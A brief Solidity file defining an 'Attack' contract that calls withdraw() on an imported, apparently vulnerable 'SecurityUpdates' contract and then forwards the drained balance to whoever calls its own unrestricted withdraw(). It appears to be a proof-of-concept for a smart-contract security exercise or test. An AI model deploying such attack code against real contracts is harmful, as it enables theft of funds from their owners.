pragma solidity ^0.4.26;

import "./SecurityUpdates.sol";

contract Attack {
    SecurityUpdates vulnerableContract;

    constructor(address _vulnerableContract) public {
        vulnerableContract = SecurityUpdates(_vulnerableContract);
    }

    function getOwner() public view returns (address) {
        return msg.sender;
    }

    function attack() public {
        vulnerableContract.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }
}